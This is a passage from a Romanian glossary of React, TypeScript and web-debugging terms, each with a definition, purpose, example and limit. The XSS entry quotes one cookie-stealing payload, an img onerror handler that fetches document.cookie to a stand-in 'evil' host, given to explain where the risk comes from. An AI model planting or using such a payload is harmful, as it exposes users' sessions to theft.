Limită: Ce se poate calcula din props și state se calculează direct în render, nu într-un effect.
Vezi și: cleanup, hook, Strict Mode

### cleanup
Forme: cleanup, cleanup-ul, cleanup-ului

Definiție: Codul care eliberează ce ai pornit (o conexiune, un fișier, un timer, un abonament) când nu mai e nevoie de el.
Scop: Previne resurse rămase deschise și efecte care continuă după ce nu mai au sens.
Exemplu: În Python, `__exit__` sau un `finally`; în React, funcția întoarsă de un effect, care rulează înaintea următorului effect și la unmount.
Limită: Un cleanup trebuie să ruleze și când apare o excepție sau o anulare; de aici `with`, `finally` și regula din asyncio de a reridica `CancelledError`.
Vezi și: effect, mount / unmount

### mount / unmount
Forme: la mount, unmount, unmount-ul, unmount-ului, la unmount

Definiție: Mount e momentul în care o componentă apare prima dată în pagină; unmount, momentul în care e scoasă și state-ul ei se pierde.
Scop: Delimitează viața unei componente: effect-urile pornesc după mount, iar cleanup-ul final rulează la unmount.
Exemplu: Când `{open && <Modal />}` trece pe `false`, `Modal` face unmount.
Limită: În dev, Strict Mode face în plus un ciclu mount → unmount → mount, ca să verifice cleanup-ul.
Vezi și: effect, cleanup, reconcilierea

### render
Forme: render, render-ul, render-ului, render-uri, render-urile, randare, randarea, randării, randează

Definiție: Apelul funcției componentei, în care React află ce trebuie afișat (JSX-ul întors), pe baza props-urilor și a state-ului din acel moment.
Scop: E pasul de calcul; abia după el React modifică pagina, doar unde e nevoie.
Exemplu: Un `setN(1)` programează un render nou; în el, `n` e 1.
Limită: Render-ul trebuie să fie pur: fără fetch, fără `setState` direct, fără modificări în afară; acelea merg în handlere sau effect-uri.
Vezi și: re-render, reconcilierea, state

### re-render
Forme: re-render, re-render-ul, re-render-uri, re-render-urile, re-randare, re-randarea, re-randează

Definiție: Un render nou al unei componente care e deja în pagină.
Scop: Apare din trei motive: state-ul ei s-a schimbat, părintele a făcut re-render sau s-a schimbat un Context pe care îl citește.
Exemplu: Când `App` face `setTheme`, toți copiii lui fac re-render, chiar dacă props-urile lor nu s-au schimbat.
Limită: Un re-render nu înseamnă modificarea paginii: React schimbă doar ce iese diferit. Variabilele locale și `useRef` nu declanșează re-render.
Vezi și: render, memoizare

### reconcilierea
Forme: reconcilierea, reconcilierii, reconciliation

Definiție: Pasul în care React compară rezultatul noului render cu cel vechi și decide ce elemente păstrează, ce modifică și ce recreează.
Scop: Explică de ce contează tipul elementului și `key`: același tip pe aceeași poziție își păstrează state-ul.
Exemplu: Dacă înlocuiești `<input>` cu `<textarea>` pe aceeași poziție, React îl recreează și textul tastat se pierde.
Limită: Cu `key={index}`, la reordonare, React lipește state-ul vechi de alt rând.
Vezi și: render, mount / unmount

### batching
Forme: batching, batching-ul, batching-ului

Definiție: Gruparea mai multor operații mici într-una singură, executată o dată.
Scop: Economisește lucru repetat: React face un singur render după mai multe `setState`, iar DataLoader trimite o singură interogare pentru mai multe chei.
Exemplu: Trei `setN` în același handler dau un singur render, nu trei.
Limită: Din React 18, batching-ul e automat și în `setTimeout`, promisiuni și handlere native, nu doar în event-urile React.
Vezi și: render, state

### memoizare
Forme: memoizare, memoizarea, memoizării, memoizează

Definiție: Păstrarea rezultatului unui calcul, ca să nu-l refaci cât timp intrările sunt aceleași.
Scop: În React evită calcule scumpe sau re-render-uri inutile (`useMemo`, `useCallback`, `memo`).
Exemplu: `useMemo(() => sort(items), [items])` sortează din nou doar când se schimbă `items`.
Limită: Costă memorie și comparații; React Compiler o face automat, iar manual o adaugi doar după ce Profiler-ul arată o problemă.
Vezi și: re-render

### Context (React)
Forme: Context-ul, Context-ului, React Context

Definiție: Mecanismul React prin care o valoare (tema, userul logat) ajunge la orice componentă de sub un Provider, fără să fie pasată prin props la fiecare nivel.
Scop: Evită „prop drilling”, adică props transmise prin componente care nu le folosesc.
Exemplu: `<ThemeContext.Provider value={theme}>`, iar oriunde dedesubt `useContext(ThemeContext)`.
Limită: Când valoarea se schimbă, toți consumatorii fac re-render. E un canal de transport, nu un state manager.
Vezi și: props, re-render, reducer

### reducer
Forme: reducer, reducer-ul, reducer-ului

Definiție: O funcție pură `(state, action) => state nou`, care descrie toate schimbările de state într-un singur loc.
Scop: Cu `useReducer`, logica unui state cu multe tranziții (un formular, un coș) se testează separat de componentă.
Exemplu: `dispatch({ type: "add", item })`, iar reducer-ul întoarce `{ ...state, items: [...state.items, item] }`.
Limită: Reducer-ul nu modifică state-ul vechi și nu face fetch; întoarce mereu o copie.
Vezi și: state, Context (React)

### input controlat
Forme: input controlat, input-ul controlat, inputuri controlate, input-uri controlate, inputurile controlate, input necontrolat, inputuri necontrolate, controlled input

Definiție: Un input a cărui valoare vine din state (`value={text}` plus `onChange`); la unul necontrolat, valoarea stă în DOM-ul browserului și o citești cu un `ref`.
Scop: Cu inputuri controlate, valoarea e mereu în state: o validezi, o formatezi sau o resetezi din cod.
Exemplu: `<input value={q} onChange={e => setQ(e.target.value)} />`
Limită: `value` fără `onChange` face inputul read-only, iar React avertizează în consolă.
Vezi și: state, DOM-ul

### DOM-ul
Forme: DOM-ul, DOM-ului, arborele DOM

Definiție: Arborele de obiecte prin care browserul reprezintă pagina; fiecare tag HTML e un nod pe care JavaScript îl poate citi și modifica.
Scop: React modifică DOM-ul în locul tău, după ce compară render-urile; tu descrii doar rezultatul.
Exemplu: `document.querySelector("input").value` citește direct din DOM.
Limită: Dacă modifici DOM-ul pe lângă React, la următorul render React poate suprascrie schimbarea.
Vezi și: reconcilierea, input controlat

### Strict Mode
Forme: Strict Mode, Strict Mode-ul, StrictMode

Definiție: Un mod React doar pentru dezvoltare, care rulează în plus unele funcții de două ori, ca să iasă la iveală bug-urile.
Scop: Găsești devreme effect-uri fără cleanup și render-uri care nu sunt pure.
Exemplu: Un effect care deschide o conexiune fără să o închidă se vede imediat: în dev apar două conexiuni.
Limită: Dublarea apare doar în dev, nu în producție.
Vezi și: effect, cleanup

### tipare structurală
Forme: tipare structurală, tiparea structurală, structural typing

Definiție: Regula TypeScript după care două tipuri sunt compatibile dacă au aceeași formă (aceleași proprietăți), indiferent de nume.
Scop: Poți pasa orice obiect care are câmpurile cerute, fără să declari că „implementează” ceva.
Exemplu: `{ id: 1, name: "Ana", age: 30 }` se potrivește cu `type User = { id: number; name: string }`, dacă vine dintr-o variabilă.
Limită: Un literal pasat direct cu o proprietate în plus dă eroare (excess property check). În C++ sau Java, compatibilitatea e după nume (tipare nominală).
Vezi și: tip generic, narrowing

### tip generic
Forme: tip generic, tipuri generice, tipul generic, funcție generică, funcția generică, funcții generice, hook generic, componentă generică, generics

Definiție: Un tip sau o funcție cu un parametru de tip (`<T>`), completat la fiecare folosire, ca aceeași logică să meargă cu orice tip, fără să-l pierzi.
Scop: `useFetch<User>(url)` întoarce `User`, nu `any`, și același hook servește orice endpoint.
Exemplu: `function first<T>(xs: T[]): T | undefined { return xs[0]; }`
Limită: Parametrul de tip dispare la runtime, spre deosebire de template-urile C++, care generează cod pentru fiecare tip.
Vezi și: utility type, tipare structurală

### narrowing
Forme: narrowing, narrowing-ul, narrowing-ului

Definiție: Restrângerea unui tip larg (`string | null`, un union) la unul mai precis, după o verificare pe care TypeScript o urmărește.
Scop: După `if (user)`, TypeScript știe că `user` nu e `null` și te lasă să-i folosești câmpurile.
Exemplu: `typeof x === "string"`, `"id" in x`, `x instanceof Date` și `x.kind === "ok"` restrâng tipul.
Limită: Narrowing-ul ține doar cât TypeScript poate urmări; după un callback sau o reasignare, poate fi pierdut.
Vezi și: type guard, union discriminat

### type guard
Forme: type guard, type guard-ul, type guard-uri, type guards

Definiție: O funcție care întoarce `x is T`; când întoarce `true`, TypeScript tratează valoarea ca `T`.
Scop: Pui o verificare de runtime într-o funcție reutilizabilă, iar compilatorul o folosește la narrowing.
Exemplu: `function isUser(x: unknown): x is User { return typeof x === "object" && x !== null && "id" in x; }`
Limită: TypeScript crede ce spune funcția; un type guard greșit minte compilatorul.
Vezi și: narrowing, type assertion

### union discriminat
Forme: union discriminat, union-ul discriminat, union-uri discriminate, union-urile discriminate, uniune discriminată, discriminated union

Definiție: Un union de tipuri obiect care au un câmp comun cu valori literale diferite (`kind: "ok" | "error"`), după care TypeScript află varianta.
Scop: Modelezi stări care se exclud (încărcare, eroare, date), iar compilatorul te lasă să citești doar câmpurile variantei curente.
Exemplu: `type R = { kind: "ok"; data: User } | { kind: "error"; msg: string }`
Limită: Cu `never` în ramura `default` a unui `switch`, compilatorul te anunță când adaugi o variantă netratată.
Vezi și: narrowing

### utility type
Forme: utility type, utility types, utility type-uri

Definiție: Un tip predefinit în TypeScript care construiește un tip nou din altul: `Partial`, `Required`, `Pick`, `Omit`, `Record`, `ReturnType`.
Scop: Derivezi tipuri din cele existente în loc să le rescrii, deci rămân sincronizate.
Exemplu: `type Patch = Partial<User>` face toate câmpurile opționale, ca la un `PATCH`.
Vezi și: tip generic

### type assertion
Forme: type assertion, type assertion-ul, type assertions

Definiție: `x as T`: îi spui compilatorului să trateze o valoare ca `T`, fără nicio verificare la runtime.
Scop: E util doar când știi mai mult decât compilatorul (de exemplu un element DOM pe care îl știi sigur).
Exemplu: `const u = (await res.json()) as User;` compilează, chiar dacă serverul trimite altceva.
Limită: Dacă presupunerea e greșită, eroarea apare mai târziu, la runtime (`Cannot read properties of undefined`). Pentru date externe validezi (zod).
Vezi și: type guard

### stack trace
Forme: stack trace, stack trace-ul, stack trace-ului, stack trace-uri

Definiție: Lista apelurilor active în momentul unei erori, de la locul unde a apărut până la punctul de pornire.
Scop: Arată unde a apărut eroarea și pe ce drum s-a ajuns acolo; o citești de sus în jos, căutând prima linie din codul tău.
Exemplu: `TypeError: Cannot read properties of undefined (reading 'name')`, urmat de `at UserCard (UserCard.tsx:12:18)`.
Limită: În producție, codul e minificat; fără source map, liniile arată fișierul compilat.
Vezi și: source map, breakpoint

### source map
Forme: source map, source map-ul, source map-uri, source maps

Definiție: Un fișier care leagă codul compilat și minificat de codul sursă original, linie cu linie.
Scop: DevTools îți arată erorile și breakpoint-urile în fișierul tău `.tsx`, nu în bundle.
Exemplu: `app.3f9a.js.map` lângă `app.3f9a.js`; Vite îl generează automat în dev.
Limită: Publicat în producție, source map-ul expune codul sursă; de regulă îl urci doar la serviciul de erori (Sentry).
Vezi și: stack trace

### breakpoint
Forme: breakpoint, breakpoint-ul, breakpoint-ului, breakpoint-uri, breakpoint-urile, breakpoints

Definiție: Un punct în cod unde debugger-ul oprește execuția, ca să vezi variabilele și stack-ul din acel moment.
Scop: Vezi starea reală, în loc s-o ghicești din `console.log`-uri.
Exemplu: Instrucțiunea `debugger;` oprește execuția acolo dacă DevTools e deschis; un breakpoint condițional se oprește doar când `id === 42`.
Limită: În CoderPad ai de regulă doar consola; acolo înlocuiești breakpoint-ul cu `console.log` țintite.
Vezi și: stack trace, source map

### error boundary
Forme: error boundary, error boundary-ul, error boundaries, error boundary-uri

Definiție: O componentă React care prinde erorile aruncate la render de componentele de sub ea și afișează o interfață de rezervă, în loc de o pagină goală.
Scop: O eroare dintr-un widget nu mai dărâmă toată aplicația.
Exemplu: `<ErrorBoundary fallback={<p>Ceva n-a mers</p>}><Chart /></ErrorBoundary>`
Limită: Nu prinde erori din handlere de event-uri, din cod async (`setTimeout`, promisiuni) sau din ea însăși; acolo folosești `try` / `catch`. Se scrie încă cu o clasă (sau biblioteca `react-error-boundary`).
Vezi și: stack trace

### CORS
Forme: CORS, CORS-ul, CORS-ului

Definiție: Regula prin care browserul permite unei pagini să citească răspunsul de la altă origine doar dacă serverul o acceptă explicit, prin header-e `Access-Control-Allow-*`.
Scop: Protejează userul: un site străin nu poate citi, cu cookie-urile userului, datele de pe alt site.
Exemplu: Frontend-ul de pe `app.exemplu.ro` apelează `api.exemplu.ro`, iar serverul răspunde cu `Access-Control-Allow-Origin: https://app.exemplu.ro`.
Limită: CORS e aplicat de browser, nu de server; `curl` sau un alt server nu țin cont de el. Nu e o protecție a API-ului.
Vezi și: preflight, XSS

### preflight
Forme: preflight, preflight-ul, preflight-ului, cererea preflight

Definiție: Cererea `OPTIONS` pe care browserul o trimite înaintea unei cereri cross-origin „nesimple”, ca să întrebe serverul dacă o acceptă.
Scop: Serverul poate refuza metoda sau header-ele înainte ca cererea reală să plece.
Exemplu: Un `POST` cu `Content-Type: application/json` sau cu header-ul `Authorization` declanșează un preflight.
Limită: Dacă serverul nu răspunde corect la `OPTIONS`, în consolă vezi o eroare CORS, iar cererea reală nu mai pleacă deloc.
Vezi și: CORS

### XSS
Forme: XSS, XSS-ul, XSS-ului

Definiție: Atacul în care un script străin ajunge să ruleze în pagina ta, de obicei din date introduse de un user și afișate fără escapare.
Scop: Scriptul rulează cu drepturile userului: citește date, trimite cereri în numele lui.
Exemplu: Un comentariu `<img src=x onerror="fetch('//evil?c='+document.cookie)">` afișat prin `dangerouslySetInnerHTML`.
Limită: JSX escapează textul, deci riscul vine din `dangerouslySetInnerHTML`, din URL-uri `javascript:` și din biblioteci care scriu direct în DOM.
Vezi și: CORS, JSX
